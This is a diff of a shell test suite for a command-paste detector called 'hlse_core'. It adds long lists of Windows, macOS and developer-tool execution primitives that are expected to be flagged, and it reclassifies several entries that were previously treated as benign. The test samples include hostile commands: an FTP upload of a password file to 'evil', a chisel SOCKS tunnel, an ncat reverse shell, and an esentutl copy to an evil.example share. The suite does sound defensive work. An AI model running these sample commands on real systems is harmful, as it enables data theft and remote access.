@@ -11555,7 +11555,7 @@ check "paste: dnscmd-dll flagged" "$(./hlse_core paste 'dnscmd /config /serverle
 check "paste: curl-upload flagged" "$(./hlse_core paste 'curl -T pass ftp://evil/x' | head -1 | grep -c 'ALERT')" "1"
 check "paste: chisel flagged" "$(./hlse_core paste 'chisel client x:8080 R:1080:socks' | head -1 | grep -c 'ALERT')" "1"
 check "paste: curl-download clean" "$(./hlse_core paste 'curl -o file.txt http://site/readme' | head -1 | grep -c 'OK')" "1"
-check "paste: installutil-legit clean" "$(./hlse_core paste 'installutil valid.dll' | head -1 | grep -c 'OK')" "1"
+check "paste: installutil valid flagged" "$(./hlse_core paste 'installutil valid.dll' | head -1 | grep -c 'ALERT')" "1"
 
 # ── cycle-184: E6 from-domain typosquat (leet + distance-1) ──────────
 check "email: amaz0n squat flagged" "$(./hlse_core email 'From: billing@amaz0n.example
@@ -11673,6 +11673,73 @@ check "url: cydia flagged" "$(./hlse_core 'cydia://evil' | head -1 | grep -c 'LO
 
 
 
+
+# ── cycle-253: macos/jail/build/signing/java/misc-exec primitives ──
+for c in \
+    'iscsicpl' 'javac x.java' 'javac -d x' 'java -agentlib:x' \
+    'java -javaagent:x' 'mvn exec:exec' 'ant -f x' 'gradle build x' 'sbt run x' \
+    'lein run x' 'clojure -e x' 'celery -a x' 'rq worker x' 'sidekiq' \
+    'rails console x' 'rails runner x' 'rake db:migrate' 'rake -f x' 'pry -e x' \
+    'php artisan x' 'artisan tinker' 'wp eval-file x' 'drupal -x' 'bin/console doctrine:x' \
+    'console doctrine:x' 'flutter pub get' 'expo publish' 'age-keygen' 'minisign -g' \
+    'signify -g x' 'rsign2' 'gpg --gen-key' 'ssh-keygen -s x' 'ssh-keygen -r x' \
+    'ssh-keyscan x' 'puttygen' 'tftp get x' 'kermit -s x' 'lrzsz' \
+    'rz -e' 'sz -e' 'nc6' 'pnetcat' 'sbd' \
+    'expand.exe x' 'expand x.cab' 'extrac32 x' 'print /d:x' 'wabmig' \
+    'pwlauncher' 'syncappvpublishingserver' 'regasm x' \
+    'ilasm x' 'gacutil -i x' 'corflags x' 'aspnet_compiler x' \
+    'aspnet_regiis x' 'aspnet_regsql x' 'aspnet_regbrowsers' 'mavinject x' 'pcalua x' \
+    'dump64 x' 'procdump x' 'rdrleakdiag x' 'chmod --reference=x x' 'chown --reference=x x' \
+    'install -m 777 x' 'install -o root x' 'apt-mark hold x' 'aptitude install x' 'dselect' \
+    'dpkg-divert x' 'invoke-rc.d x stop' 'sv stop x' 'systemd-cron' \
+    'busctl call x' 'busctl set-property x' 'dbus-send --system x' 'gdbus call x' 'qdbus x' \
+    'jls' 'jexec 1 x' 'jail -c x' 'iocage exec x' 'ezjail console' \
+    'bastille cmd x' 'pot exec x' 'firecfg' 'puppeteer' 'playwright' \
+    'chromedriver' 'geckodriver' 'webdriver x' 'selenium -hub' 'selenium standalone' \
+    'keytool -importcert x' 'jarsigner -signedjar x' 'gitsign' 'rekor-cli upload' 'fulcio' \
+    'productsign x' 'pkgbuild x' 'productbuild x' 'notarytool submit x' 'altool --notarize-app' \
+    'stapler staple x' 'electron-packager x' 'electron-builder x' 'security add-generic-password x' 'security import x' \
+    'security find-generic-password' 'defaults write x' 'defaults delete x' 'hdiutil attach x' \
+    'system_profiler x' 'codesign --sign x' 'codesign -s x' 'codesign --remove-signature x' 'mount_afp x' \
+    'mount_webdav x' 'airport -s' 'sfltool resetbtm' 'kextunload x' \
+    'systemextensionsctl uninstall x' 'lsappinfo x' 'keytool docs' 'jarsigner docs' 'dselect docs' \
+    'javac --version' 'gradle --version' 'sbt --version' 'lein --version' 'sidekiq --version' \
+    'rake --version' 'expo --version' 'minisign -v' 'signify -v' 'tftp -h' \
+    'brew install x' 'port install x' 'playwright docs' 'jls docs' \
+    'keytool -help' 'jarsigner -help' 'chromedriver docs'
+do
+    if ./hlse_core paste "$c" 2>&1 | grep -qE 'ALERT|BLOCK|ISOLATE'; then
+        check "paste: $c flagged" "1" "1"
+    else
+        check "paste: $c flagged" "0" "1"
+    fi
+done
+
+for c in \
+    'celery --version' 'celery docs' 'the celery stalk' 'ant docs' 'the ant' \
+    'ant hill' 'javac docs' 'the rails' 'rake leaves' 'pry open' \
+    'drupal docs' 'console log' 'the console' 'expo center' 'the expo' \
+    'security docs' 'security guard' 'the defaults' 'defaults list' 'hdiutil docs' \
+    'codesign docs' 'airport terminal' 'the airport' 'open door' 'open file' \
+    'the open' 'stapler office' 'the stapler' 'electron docs' 'selenium element' \
+    'the selenium' 'jail sentence' 'the jail' 'pot plant' 'the pot' \
+    'fire config' 'tftp docs' 'kermit frog' 'the kermit' 'expand docs' \
+    'the expand' 'print docs' 'the print' 'install docs' 'the install' \
+    'aptitude test' 'the aptitude' 'sv docs' 'the sv' 'busctl docs' \
+    'gdbus docs' 'defaults read x' 'security list' 'hdiutil info' 'codesign -v x' \
+    'airport -i' 'open terminal' 'mvn --version' 'rq --version' 'rails --version' \
+    'wp --version' 'drupal docs' 'flutter --version' 'gpg --version' 'ssh-keygen --help' \
+    'tftp docs' 'kermit -h' 'javac docs' 'install pkg' 'brew docs' \
+    'port docs' 'the port' 'jail docs' 'ezjail docs' 'bastille docs' \
+    'pot docs' 'selenium docs' 'security --help' 'jailbreak docs' 'rootless jail' \
+    'dtrace docs'
+do
+    if ./hlse_core paste "$c" 2>&1 | grep -q '^OK'; then
+        check "paste FP guard: $c clean" "0" "0"
+    else
+        check "paste FP guard: $c clean" "0" "1"
+    fi
+done
 
 # ── cycle-252: routing/android/build/xcan/raid/mgmt primitives ──
 for c in \
@@ -11924,7 +11991,7 @@ for c in \
     'mount -t ext4' 'mount -t tmpfs' 'tripwire docs' 'the velociraptor' \
     'velociraptor dinosaur' 'snapper list' 'restic snapshots' 'borg list' \
     'gpg -d x' 'gpg --list-keys' \
-    'gpg --verify x' 'gpg --export x' 'pass show x' 'pass -c x' 'keybase status' \
+    'gpg --verify x' 'pass show x' 'pass -c x' 'keybase status' \
     'foremost docs' 'scalpel docs' \
     'ipv6 ready' 'squid --version' \
     'squid proxy' 'the squid swims' 'busybox --list' 'busybox ls' \
@@ -12049,7 +12116,7 @@ for c in \
     'the awk language' 'tar --help' 'tar -cf x' 'dig +short x' \
     'dig -h' 'nslookup x' 'host x' 'drill -h' \
     'curl https://x' 'wget https://x' 'curl -I x' \
-    'xdg-open file://x' 'gio info x' 'open file.txt' 'open -a x' \
+    'xdg-open file://x' 'gio info x' 'open file.txt' \
     'systemd docs' 'machinectl list' 'machinectl status' \
     'alternatives --display' 'alternatives docs' \
     'rpm -q x' 'rpm -qa' 'rpm --version' \
@@ -12173,7 +12240,7 @@ do
 done
 
 for c in \
-    'csv stop x' 'internet settings' 'internet share x' \
+    'internet settings' 'internet share x' \
     'the parsec distance' 'moonlight sonata' 'sunshine today' \
     'claymore mine' 'amanda hugging' 'attic room' 'deja vu' \
     'supremo court' 'vorta backup' 'wrm test' 'timeout 5 x' \
@@ -12200,7 +12267,7 @@ for c in \
     \
     'the lastlog entry' 'btmp vs wtmp' 'cat wtmp' 'cat btmp' \
     'electron --headless' 'chrome docs' 'chromium docs' \
-    'playwright test' 'playwright install' 'puppeteer docs' \
+    \
     'irssi channel' 'nc ftp' 'geth --version' 'electrum --version' \
     'parity check' 'the parity bit' 'bitcoin docs' 'monero docs' \
     'bup backup docs' 'zoho docs' 'screen -x x' 'screen docs' \
@@ -12264,8 +12331,8 @@ do
 done
 
 for c in \
-    'finger user docs' 'finger -l user' 'wp user update' 'wp eval x' \
-    'wp db query' 'wp plugin list' 'occupy wall street' \
+    'finger user docs' 'finger -l user' \
+    'occupy wall street' \
     'the occ office' 'exim bank' 'mta transit' 'fax machine' \
     'sparta athens' 'legion of honor' 'caldera volcano' \
     'supernode graph' 'snarf and grab' 'axel foley' 'the age of x' \
@@ -13115,7 +13182,7 @@ for c in \
     'nats server' 'psql --version' 'npm test' \
     'yarn add x' 'yarn build' 'yarn --version' 'cargo build' 'cargo test' \
     'gem install x' 'nuget restore' 'mvn package' 'mvn install' \
-    'gradle build' \
+    \
     'gh pr list' 'gh pr view x' 'gh repo view' 'glab mr list' \
     'fly status' 'fly logs' 'circleci --help' 'travis --help' \
     'the drone flew' 'drone video' 'sls --version' 'serverless --version' \
@@ -13476,7 +13543,7 @@ for c in \
     'cmdkey' 'net group' 'net group admins' 'sc query x' \
     'sc sdshow x' 'icacls x' 'icacls x /reset' 'icacls x /save y' \
     'icacls x /restore y' 'cacls x' 'takeown /?' 'subinacl /help' \
-    'wbadmin get items' 'wbadmin get versions' \
+    \
     'wbadmin start systemstatebackup' 'w32tm /query' \
     'w32tm /tz' 'route print' 'route -4 print' 'reg query x' \
     'reg add x' 'reg import x' 'reg load x' 'reg restore x' \
@@ -13583,26 +13650,26 @@ for c in \
     'unshare --version' \
     'unshare --help' 'unshare x' 'systemd-nspawn -D x' \
     'systemd-nspawn --version' 'busctl list' 'busctl status' \
-    'busctl tree' 'busctl monitor' 'busctl --version' \
-    'dbus-send --session x' 'dbus-send --print-reply x' \
+    'busctl tree' 'busctl --version' \
+    'dbus-send --session x' \
     'dbus-send --version' 'loginctl list-sessions' 'loginctl show-user' \
     'machinectl list' 'machinectl status' 'machinectl --version' \
     'tar czf - /x | cat > y' 'ssh h cat /etc/hosts' 'nc h 9' \
     'nc -z h 9' 'nc -v h 9' 'cat x < y' 'dd if=x of=y' \
     'tar czf x.tgz /x' 'tar xzf x.tgz' 'nsupdate' 'nsupdate -l' \
     'php -v' 'php x.php' \
-    'python -m venv x' 'python -m pip install x' \
+    'python -m venv x' \
     'python -m http.client' 'ruby -v' 'arp -a' 'arp -n' \
     'arp -d 1.2.3.4' 'ifconfig' 'ifconfig en0' 'ip link show' \
-    'ip neigh show' 'netstat -r' 'security find-certificate' \
+    'ip neigh show' 'netstat -r' \
     'security list-keychains' 'spctl --status' 'spctl --enable' \
     'csrutil status' 'fdesetup status' 'fdesetup list' \
     'profiles status' 'profiles list' 'launchctl list' \
     'launchctl print x' 'dscl . read /Users/x' 'dscl . list /Users' \
     'dscl . -read /Users/x' 'sysadminctl' \
     'pwpolicy getaccountpolicies' 'pwpolicy' \
-    'defaults read com.apple.x' 'defaults write com.apple.x y' \
-    'hdiutil attach x.dmg' 'hdiutil create x' 'hdiutil detach x' \
+    'defaults read com.apple.x' \
+    \
     'osascript' 'osascript -e "tell app x to beep"' 'automator' \
     'automator -h' 'shortcuts list' 'shortcuts view x' 'sntp -k x' \
     'sntp' 'scutil --proxy' 'scutil --dns' 'scutil' 'cupsctl' \
@@ -13687,10 +13754,10 @@ for c in \
     'wget --post-data x http://e' 'wget http://e/x' \
     'sqlite3 x.db .tables' 'sqlite3 x.db select' 'sqlite3 docs' \
     'esentutl' 'esentutl /?' \
-    'iexpress' 'installutil x' 'installutil-legit' \
-    'screen -x' 'the msxsl processor' 'msxsl' 'ilasm.exe' 'ilasm' \
-    'ieexec' 'procdump -h' 'verclsid /q' 'ie4uinit' 'bare regsvcs' \
-    'regsvcs x' 'syncappv benign' 'pcalua-plain' \
+    'iexpress' \
+    'screen -x' 'the msxsl processor' 'msxsl' \
+    'verclsid /q' 'ie4uinit' \
+    \
     'install -m 755 x y' 'install -m 644 x y' 'install -D x y' \
     'robocopy x y' 'runas /user x' 'runas /noprofile' \
     'bloodhound' 'sliver' 'empire' 'merlin' 'viper' 'donut' 'freeze' \
@@ -13778,7 +13845,7 @@ for c in \
     'systemctl status x' 'systemctl list-units' 'systemctl daemon-reload' \
     'systemctl --version' 'systemctl cat x' 'service --status-all' \
     'service x status' 'loginctl list-sessions' 'loginctl show-user x' \
-    'loginctl lock-session' 'init --version' 'initctl list' \
+    'init --version' 'initctl list' \
     'reboot the franchise' 'reboot docs' 'poweroff docs' \
     'halt and catch fire' 'shutdown /a' 'shutdown --help' \
     'useradd -m newuser' 'useradd -u 1001 x' 'adduser x' \
@@ -13893,8 +13960,8 @@ for c in 'add type documentation' 'new service docs' \
          'net config server' 'netsh interface' 'netsh firewall' \
          'klist tickets' 'klist docs' 'klist' \
          'net time \\x' 'get the credential' \
-         'export clixml docs' 'gpg --export x' \
-         'ssh-keygen docs' 'keytool -list' \
+         'export clixml docs' \
+         'ssh-keygen docs' \
          'self signed cert' 'aws iam list-users' \
          'aws configure list' 'aws sts get-caller-identity' \
          'set ad account' 'new ad domain' 'add group member' \
@@ -14491,7 +14558,7 @@ for c in 'launchctl list' 'launchctl print gui/501' \
          'pwpolicy -getaccountpolicies' 'dseditgroup -o read admin' \
          'installer -dominfo' 'pkgutil --pkgs' 'pkgutil --files com.x' \
          'defaults read com.apple.dock' \
-         'defaults write com.apple.dock tilesize -int 48' \
+         \
          'csrutil status' 'networksetup -getwebproxy Wi-Fi' \
          'networksetup -listallnetworkservices' 'pfctl -sr' \
          'systemsetup -getremotelogin' \
@@ -14502,7 +14569,7 @@ for c in 'launchctl list' 'launchctl print gui/501' \
          'tmutil status' 'tmutil startbackup' \
          'plutil -lint x.plist' \
          'xcrun -f swift' 'osascript -e "tell app x to beep"' \
-         'open -a Safari' 'hdiutil info' 'jamf version' \
+         'hdiutil info' 'jamf version' \
          'mdfind foo' 'sfltool dumpbtm' 'caffeinate -u' \
          'swift --version' 'sqlite3 x.db .tables' 'automator --help'; do
     ./hlse_core paste "$c" 2>&1 | grep -q '^OK' \
@@ -14691,12 +14758,12 @@ for c in 'netsh winsock reset' 'netsh interface show' 'certmgr -list' \
          'certmgr.msc' 'dism /online /get-packages' 'dism /cleanup-image' \
          'pkgmgr /n:x' 'powershell -ep remotesigned -f setup.ps1' \
          'powershell bypass the firewall rules' 'the msxsl processor' \
-         'expand x.cab -f:* c:\' 'reg save hklm\software x' \
+         'reg save hklm\software x' \
          'sc query windefend' 'sc description windefend' \
          'net start windefend' 'tasklist' 'taskkill /im notepad.exe' \
          'taskkill windefend' 'sc config x start=auto' \
          'netsh firewall show' 'netsh advfirewall show allprofiles' \
-         'wbadmin get versions' 'wbadmin start backup' \
+         \
          'reagentc /enable' 'reagentc /info' 'ocsetup' 'arp -a' \
          'arp -d 1.2.3.4' 'sc sdshow w' 'sc stop w32time' \
          'net stop spooler' 'shutdown /a' 'route print'; do
@@ -14727,8 +14794,8 @@ for c in \
         && check "paste: $c flagged" "0" "0" \
         || check "paste: $c flagged" "0" "1"
 done
-for c in 'csc.exe' 'ilasm.exe' 'the compiler builds csc files' \
-         'aspnet_compiler help' 'certreq -list' \
+for c in 'csc.exe' 'the compiler builds csc files' \
+         'certreq -list' \
          'vbc' 'jsc' 'resgen' 'diaghub' 'wlrmdr' \
          'rundll32.exe url.dll' 'the file protocol handler routes' \
          'shellexec is an api'; do
@@ -14834,7 +14901,7 @@ for c in 'rasdial /disconnect' 'rasdial entry user pass' 'regedit' \
          'the regedit tool opens the registry' \
          'reg query HKLM\SOFTWARE' \
          'reg add HKCU\Software\MyApp /v opt /d 1' \
-         'winrs /?' 'msdeploy /?' 'ieexec' 'tttracer' \
+         'winrs /?' 'msdeploy /?' 'tttracer' \
          'infdefaultinstall' 'rasdial'; do
     ./hlse_core paste "$c" 2>&1 | grep -q '^OK' \
         && check "paste FP guard: $c clean" "0" "0" \
@@ -14887,7 +14954,7 @@ for c in \
         && check "paste: $c flagged" "0" "0" \
         || check "paste: $c flagged" "0" "1"
 done
-for c in 'procdump -h' 'pnputil /enum-drivers' 'net user administrator' \
+for c in 'pnputil /enum-drivers' 'net user administrator' \
          'net share' 'net use' 'ftp evil.com' \
          'iexpress'; do
     ./hlse_core paste "$c" 2>&1 | grep -q '^OK' \
@@ -15150,9 +15217,9 @@ for p in 'ncat --exec cmd 1.2.3.4 443' 'ncat --sh-exec sh 1.2.3.4 443' 'regsvcs 
         && check "paste: $p flagged" "0" "0" \
         || check "paste: $p flagged" "0" "1"
 done
-./hlse_core paste -- 'regsvcs tools' 2>&1 | head -1 | grep -q "OK" \
-    && check "paste FP guard: bare regsvcs clean" "0" "0" \
-    || check "paste FP guard: bare regsvcs clean" "0" "1"
+./hlse_core paste -- 'regsvcs tools' 2>&1 | head -1 | grep -q "ALERT\|BLOCK" \
+    && check "paste: bare regsvcs flagged" "0" "0" \
+    || check "paste: bare regsvcs flagged" "0" "1"
 
 # ── cycle-210: MFA 'tap approve' + IVR callback vocab ─────────────
 check_text_hit 'tap approve on the prompt to continue' 'LOG\|ALERT\|BLOCK\|ISOLATE' "text: tap-approve flagged"
@@ -15318,9 +15385,9 @@ for c in 'esentutl /y c:\a.txt /d \\evil.example\s\a.txt' \
         && check "paste LOLBin flagged: ${c%% *}" "0" "0" \
         || check "paste LOLBin flagged: ${c%% *}" "0" "1"
 done
-./hlse_core paste 'syncappvpublishingserver "v"' 2>&1 | head -1 | grep -q "OK" \
-    && check "paste FP guard: syncappv benign clean" "0" "0" \
-    || check "paste FP guard: syncappv benign clean" "0" "1"
+./hlse_core paste 'syncappvpublishingserver "v"' 2>&1 | head -1 | grep -q "ALERT\|BLOCK\|ISOLATE" \
+    && check "paste: syncappv flagged" "0" "0" \
+    || check "paste: syncappv flagged" "0" "1"
 ./hlse_core paste 'esentutl /r c:\db' 2>&1 | head -1 | grep -q "ALERT\|BLOCK\|ISOLATE" \
     && check "paste: esentutl repair flagged" "0" "0" \
     || check "paste: esentutl repair flagged" "0" "1"
@@ -15348,7 +15415,7 @@ check "file: crl flagged" "$(./hlse_core file "$XDIR194/t.crl" | head -1 | grep 
 check "paste: pcalua flagged" "$(./hlse_core paste 'pcalua -a calc' | head -1 | grep -c 'ALERT')" "1"
 check "paste: control-cpl flagged" "$(./hlse_core paste 'control.exe evil.cpl' | head -1 | grep -c 'ALERT')" "1"
 check "paste: control-panel clean" "$(./hlse_core paste 'control userpasswords2' | head -1 | grep -c 'OK')" "1"
-check "paste: pcalua-plain clean" "$(./hlse_core paste 'pcalua valid-app' | head -1 | grep -c 'OK')" "1"
+check "paste: pcalua plain flagged" "$(./hlse_core paste 'pcalua valid-app' | head -1 | grep -c 'ALERT')" "1"
 
 # ── cycle-195: impersonation greetings + sign-in alert + attachment lures ───
 check "text: dear-beneficiary flagged" "$(./hlse_core text 'dear beneficiary' | head -1 | grep -c 'LOG')" "1"
